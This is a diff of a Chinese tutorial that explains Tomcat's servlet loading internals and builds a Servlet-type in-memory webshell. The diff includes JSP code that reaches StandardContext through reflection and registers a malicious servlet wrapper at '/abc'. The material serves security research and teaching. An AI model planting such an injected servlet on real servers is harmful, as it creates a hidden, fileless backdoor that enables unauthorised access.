@@ -1,28 +1,35 @@
 # Tomcat-Servlet型内存马
 
+<center>@Y4tacker</center>
+
+这一篇是在tomcat8的版本下，进行的调试
+
 ## 简单配置一个Servlet
 
-在web.xml添加
+在web.xml添加，这里我们将load-on-startup值设置为1，原因是为了便于简化调试的过程，在每个Servlet的启动顺序在web.xml中，如果没有声明 load-on-startup 属性（默认为-1），则该Servlet不会被动态添加到容器，这一点比较重要
 
 ```xml
-<servlet>
-<servlet-name>TestServlet</servlet-name>
-<servlet-class>test.TestServlet</servlet-class>
-</servlet>
-
 <servlet-mapping>
-<servlet-name>TestServlet</servlet-name>
-<url-pattern>/kaixin</url-pattern>
-</servlet-mapping>
+        <servlet-name>ExportServlet</servlet-name>
+        <url-pattern>/export</url-pattern>
+    </servlet-mapping>
+    <servlet>
+        <servlet-name>TestServlet</servlet-name>
+        <servlet-class>com.jbxz.TestServlet</servlet-class>
+        <load-on-startup>1</load-on-startup>
+    </servlet>
 ```
 
-随便写一个Servlet
+接下来随便写一个Servlet
 
 ```Java
 public class TestServlet extends HttpServlet {
-public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {        PrintWriter writer = response.getWriter();
-writer.println("hello");
+    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+        PrintWriter writer = response.getWriter();
+        writer.println("hello");
+    }
 }
+
 ```
 
 ## 断点调试
@@ -43,9 +50,15 @@ writer.println("hello");
 
 在每个Servlet的启动顺序在web.xml中，如果没有声明 load-on-startup 属性（默认为-1），则该Servlet不会被动态添加到容器：
 
-然后对每个wapper进行装载
+然后对每个wapper进行装载![](img/3.png)
 
-![](img/3.png)
+很明显在第一行，我们可以看到这里加载servlet，同时这里注意下小知识点，Java的synchronized是Java中的关键字，被Java原生支持，是一种最基本的同步锁，它可以帮助我们解决线程冲突
+
+![](img/8.png)
+
+在这里通过获取servletClass来装载servlet
+
+![](img/9.png)
 
 装载所有的 Servlet 之后，就会根据具体请求进行初始化、调用、销毁一系列操作： 
 
@@ -59,26 +72,25 @@ writer.println("hello");
 销毁：停止服务器时调用destroy()方法，销毁实例
 ```
 
-一步步调试很麻烦，网上看到这篇文章https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w找到了启发
+因此一个很重要的就是之前的StandardWrapper
 
-直接查看添加一个servlet后StandardContext的变化
+还记得之前的findChildren()么，一个child对应一个封装了Servlet的StandardWrapper对象，所以我们需要去构造一个wrapper
 
-![](img/4.png)
+接下来我们一步一步往上思考，这样才能逐渐接近真相，接下来我们来思考，这个wrapper又是从哪里取得的呢，没错就是findChildren()遍历的时候得到的，很容易我们就能找到添加的函数
 
-一个child对应一个封装了Servlet的StandardWrapper对象，其中有servlet的名字跟对应的类
+`org.apache.catalina.core.StandardContext#addChild`其调用`super.addChild(child);`也就是`org.apache.catalina.core.ContainerBase#addChild`![](img/10.png)
 
-![](img/5.png)
+这个父类也是通过调用`addChildInternal`，在这里会注册这个Servlet，这里不多讲有兴趣可以进一步跟入![](img/11.png)
 
-对应了配置中的
+之后我们再次回到`org.apache.catalina.core.StandardContext#addChild`
 
-```xml
-<servlet-mapping>
-<servlet-name>TestServlet</servlet-name>
-<url-pattern>/kaixin</url-pattern>
-</servlet-mapping>
-```
+这里很重要哦，由于我们是通过访问jsp文件所以这里也是要执行的，只是调试的时候不会有
 
-所以Servlet型内存Webshell的主要步骤如下：
+![](img/12.png)
+
+## 动手实现一个Servlet型号=内存马
+
+通过上面的步骤，所以Servlet型内存Webshell的主要步骤如下：
 
 - 创建恶意Servlet
 - 用Wrapper对其进行封装
@@ -136,7 +148,6 @@ writer.println("hello");
     };
 %>
 <%
-    // 一个小路径快速获得StandardContext
     Field reqF = request.getClass().getDeclaredField("request");
     reqF.setAccessible(true);
     Request req = (Request) reqF.get(request);
@@ -151,7 +162,6 @@ writer.println("hello");
     newWrapper.setServletClass(servlet.getClass().getName());
 %>
 <%
-    // url绑定
     stdcontext.addChild(newWrapper);
     stdcontext.addServletMappingDecoded("/abc", name);
 %>
